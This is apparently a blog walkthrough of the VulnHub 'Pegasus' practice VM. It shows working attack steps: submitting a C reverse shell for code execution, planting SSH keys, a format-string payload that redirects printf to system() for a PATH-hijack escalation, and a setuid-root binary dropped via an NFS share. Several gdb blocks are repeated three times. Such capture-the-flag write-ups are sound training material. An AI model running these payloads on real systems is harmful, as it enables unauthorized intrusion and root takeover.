---
layout: post
title: Pegasus Timbeeeeer!!!!  Walkthrough!
tags:
- challenge
- hacking
- pegasus
- timber
- vm
- vulnhub
---
Hello everyone this is pegasus VM walkthrough for practising and having fun :D
greetings to everyone for creating this great challenge

I started by running nmap to check all the services that pegasus has on it!>root@Tesla:~# nmap 192.168.7.138 -p- -A

Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2015-11-05 17:51 EET
Nmap scan report for 192.168.7.138 (192.168.7.138)
Host is up (0.00016s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA)
|   2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA)
|_  256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          36231/udp  status
|_  100024  1          42084/tcp  status
8088/tcp  open  http    nginx 1.1.19
42084/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:EA:73:26 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



more
after seing these services i checked the nginx server right away to see what the webserver had for us

[![peg1](https://trickster0.files.wordpress.com/2015/11/peg1.png)](https://trickster0.files.wordpress.com/2015/11/peg1.png)
Nothing obvious there, although i downloaded the picture and checked it with strings it gave some interesting results..
it gave 2 sets of characters i thought that it might want to hint me on making a wordlist with them but i gave up on it and moved on. next thing i did,was to use dirb to find any secret folders/files but it gave nothing! after a lot of search i checked on another walkthrough and people used dirbuster with another wordlist and so did i

[![peg2](https://trickster0.files.wordpress.com/2015/11/peg2.png)](https://trickster0.files.wordpress.com/2015/11/peg2.png)
submit.php file did nothing on its own but apparently it was used with the other file codereview.php file i found

[![peg3](https://trickster0.files.wordpress.com/2015/11/peg3.png)](https://trickster0.files.wordpress.com/2015/11/peg3.png)

Apparently it wanted to hint me that this box would run some inputted code of mine. so i started pasting python,php,perl reverse shells but nothing until i tried C and magic actually happened!!!i used this 
[shell](https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/)

[![peg4](https://trickster0.files.wordpress.com/2015/11/peg4.png)](https://trickster0.files.wordpress.com/2015/11/peg4.png)

i didnt like my shell :/ i needed something better plus the fact that the shell would stop after a while and disconnect me so i created really quick some ssh-keygen and inserted my public key into the authorized_keys. So i connected through ssh :D

[![peg5](https://trickster0.files.wordpress.com/2015/11/peg5.png)](https://trickster0.files.wordpress.com/2015/11/peg5.png)
i did some enumeration to the system look around, but nothing interesting except from a fail named my_first. So as the name stated it is a noob's first program so it is fair to assume that there is a vuln there isn't it? Also the code that i could execute was C so this is obvious a wannabe C master...Since everything is in C i supposed Format strings vulnerabillities(which as a matter of fact i hate). Not to add that this program will give us elevated rights so one more reason to try using it for our "legal" purpose. I will try to explain what i did as good as i can...
I executed the program to check it out

[![peg6](https://trickster0.files.wordpress.com/2015/11/peg6.png)](https://trickster0.files.wordpress.com/2015/11/peg6.png)
it is about time testing it for format string vuln

[![peg7](https://trickster0.files.wordpress.com/2015/11/peg7.png)](https://trickster0.files.wordpress.com/2015/11/peg7.png)
obiously at the first try i checked for a normal input but at the second try i actually tested it. 
so what do we see there?? this is a so called format string vuln. how does it work?? when someone compiles a C program and uses some vulnerable functions like printf(and all of its damn family) like this printf ("hi",%x) what it actually does is put the input at the top of the stack so we request it by asking %x in the inputs of the program to show the address of the stack in hex. so in the second input on the second try we added some %x to get more of the addresses in the stack. 
On my next step i changed my input a little bit. i added some A's

[![peg8](https://trickster0.files.wordpress.com/2015/11/peg8.png)](https://trickster0.files.wordpress.com/2015/11/peg8.png)
Adter some testing i noticed that i dont need to input format strings on the first input... only the second one had the error. So what did i do here? i added some A's and some %x's to see if somewhere along the memory i managed to change an address and after 8 %x's we can see that the address now is 41414141 which in ascii is AAAA. so apparently we managed to change the memory address there. The system was running ASLR so i ran


>ulimit -s unlimited


after that i ran the program on gdb to figure out a few addresses like the system()'s address

[![peg9](https://trickster0.files.wordpress.com/2015/11/peg9.png)](https://trickster0.files.wordpress.com/2015/11/peg9.png)
next thing i had to find would be the printf's function address

[![peg10](https://trickster0.files.wordpress.com/2015/11/peg10.png)](https://trickster0.files.wordpress.com/2015/11/peg10.png)
i used objdump, nothing more to add here
next thing i did, was to create a small payload by using the program automatically and actually write the printf's address into the address that we previously changed into AAAAs. how do we do this you ask? well it is really simple we have this amazing format string called %n that will allow us to do it.Plus we before this part on our payload we specified the 8th position of the address. here is what happened

[![peg11](https://trickster0.files.wordpress.com/2015/11/peg11.png)](https://trickster0.files.wordpress.com/2015/11/peg11.png)
see? we wrote 4 on the address where we got the segfault so that is good now we need to change that address into the system() address that we have. lets start by getting the second half. we need to find in decimal 0x9060-0x4


>mike@pegasus:~$ python -c 'print 0x9060-0x4'
36956


i changed a little bit my next payload and ran gdb again to see if we succeeeded in chaniging the second half of the address


>mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08%%36956u%%8$n' > payload
mike@pegasus:~$ gdb -q ./my_first 
Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
(gdb) r < payload 
Starting program: /home/mike/my_first < payload
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ��    

Program received signal SIGSEGV, Segmentation fault.
0x00009060 in ?? ()
(gdb)
>mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08%%36956u%%8$n' > payload
mike@pegasus:~$ gdb -q ./my_first 
Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
(gdb) r < payload 
Starting program: /home/mike/my_first < payload
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ��    

Program received signal SIGSEGV, Segmentation fault.
0x00009060 in ?? ()
(gdb)
>mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08%%36956u%%8$n' > payload
mike@pegasus:~$ gdb -q ./my_first 
Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
(gdb) r < payload 
Starting program: /home/mike/my_first < payload
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ��    

Program received signal SIGSEGV, Segmentation fault.
0x00009060 in ?? ()
(gdb)


As we can see everything worked out! now we need to change the first half. here is what we did


>mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%9$n' > payload
mike@pegasus:~$ gdb -q ./my_first 
Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
(gdb) r < payload 
Starting program: /home/mike/my_first < payload
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ����  
Program received signal SIGSEGV, Segmentation fault.
0x90609060 in ?? ()
(gdb)
>mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%9$n' > payload
mike@pegasus:~$ gdb -q ./my_first 
Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
(gdb) r < payload 
Starting program: /home/mike/my_first < payload
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ����  
Program received signal SIGSEGV, Segmentation fault.
0x90609060 in ?? ()
(gdb)
>mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%9$n' > payload
mike@pegasus:~$ gdb -q ./my_first 
Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
(gdb) r < payload 
Starting program: /home/mike/my_first < payload
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ����  
Program received signal SIGSEGV, Segmentation fault.
0x90609060 in ?? ()
(gdb)


In this case we wrote 4 more bytes so teh 36956 went down to 36952. Now we need to find the decimal for the first half


>mike@pegasus:~$ python -c 'print 0x14006-0x9060'
44966


so i changed my payload again and ran gdb


>mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' > payload
mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
(gdb) r < payload 
Starting program: /home/mike/my_first < payload
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ����             
sh: 1: Selection:: not found

Program received signal SIGSEGV, Segmentation fault.
0x08c3be89 in ?? ()
(gdb)
>mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' > payload
mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
(gdb) r < payload 
Starting program: /home/mike/my_first < payload
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ����             
sh: 1: Selection:: not found

Program received signal SIGSEGV, Segmentation fault.
0x08c3be89 in ?? ()
(gdb)
>mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' > payload
mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
(gdb) r < payload 
Starting program: /home/mike/my_first < payload
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ����             
sh: 1: Selection:: not found

Program received signal SIGSEGV, Segmentation fault.
0x08c3be89 in ?? ()
(gdb)


If you can see the sh: 1: Selection:: then it means we have accomplished out goal and victory should be closer


>mike@pegasus:~$ touch Selection\:
mike@pegasus:~$ nano Selection\: 
mike@pegasus:~$ chmod +x Selection\: 
mike@pegasus:~$ export PATH=$PATH:.
mike@pegasus:~$ echo PATH
PATH
mike@pegasus:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:.
mike@pegasus:~$ cat payload | ./my_first 
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 
Enter first number: Enter second number: Error details: ����             
Segmentation fault (core dumped)
mike@pegasus:~$ ls -la /tmp
total 108
drwxrwxrwt  2 root root   4096 Nov 23 03:19 .
drwxr-xr-x 22 root root   4096 Nov 19  2014 ..
-rwsr-sr-x  1 john mike 100284 Nov 23 03:19 dash
mike@pegasus:~$


As you notice, above, i created a file named Selection: and made it executable cause that is what we managed to do with my_first program to execute. Next i added on the $PATH the . so it can execute freely,inserted my payload and ran my_first program that made. What that file that i made did??it copied the /bin/dash file in the /tmp folder with elvated permissions and by elevated permissions i mean john!

[![peg12](https://trickster0.files.wordpress.com/2015/11/peg12.png)](https://trickster0.files.wordpress.com/2015/11/peg12.png)
 First thing i did, was to add my ssh public key in the authorized_keys of john's and right away connect via ssh to him

[![peg13](https://trickster0.files.wordpress.com/2015/11/peg13.png)](https://trickster0.files.wordpress.com/2015/11/peg13.png)

[![peg14](https://trickster0.files.wordpress.com/2015/11/peg14.png)](https://trickster0.files.wordpress.com/2015/11/peg14.png)
i typed sudo -l but this is what i got


>john@pegasus:~$ sudo -l
Matching Defaults entries for john on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs


so.....yeah


>john@pegasus:~$ sudo /usr/local/sbin/nfs start
 * Exporting directories for NFS kernel daemon...                         [ OK ] 
 * Starting NFS kernel daemon                                             [ OK ]


I went back to my Kali box and mounted the NFS. I created a file that would elevate my permissions to root and execute dash


>root@Tesla:~# cd /mnt
root@Tesla:/mnt# mkdir nfs
root@Tesla:/mnt# mount 192.168.7.138:/opt/nfs nfs
root@Tesla:/mnt# cd nfs
root@Tesla:/mnt/nfs# cat file.c
#include 
#include 
int main(int argc, char *argv[]){
 setreuid(geteuid(), geteuid());
 setregid(geteuid(), geteuid());
 execv("/bin/dash", argv);
 return 0;
}
root@Tesla:/mnt/nfs# gcc -o root file.c -m32
root@Tesla:/mnt/nfs# chmod 4777 root


......And back to john


>john@pegasus:/opt/nfs$ ./root
# id
uid=0(root) gid=0(root) groups=0(root),1000(john)
# cd /root
# ls
flag
# cat flag



[![peg15](https://trickster0.files.wordpress.com/2015/11/peg15.png)](https://trickster0.files.wordpress.com/2015/11/peg15.png)
Hallelujah!! It was kinda hard since i hated format strings but anyway it was fun. thx to everyone + some bonus below

This is the code that executed my C reverse shell from the codereview.php and also stopped it(mixed feelings on this one)


>mike@pegasus:~$ cat check_code.sh 
#!/bin/sh
#
# I am a 'human' reviewing submitted source code :)
#

SOURCE_CODE="/opt/code_review/code.c"

# Kill whatever is running after 120 seconds
TIMEOUT=120

while true; do
    echo "# Checking for code.c..."
    if [ -f $SOURCE_CODE ]; then
        echo " # Compile..."
        /usr/bin/gcc -o /home/mike/code $SOURCE_CODE
        /bin/chmod 755 /home/mike/code
        echo " # Run"
        (/home/mike/code) & PID=$!
        # Let the code run for $TIMEOUT, then kill it if still executing
        (/bin/sleep $TIMEOUT && kill -9 $PID; echo " # Killed ./code") 2>/dev/null & WATCHER=$!
        # Kill the watched (code stopped executing before $TIMEOUT)
        wait $PID 2>/dev/null && kill -9 $WATCHER; echo " # Killed watcher"
        echo " # Cleanup..."
        /bin/rm -f /home/mike/code $SOURCE_CODE
    fi
    /bin/sleep 1
done
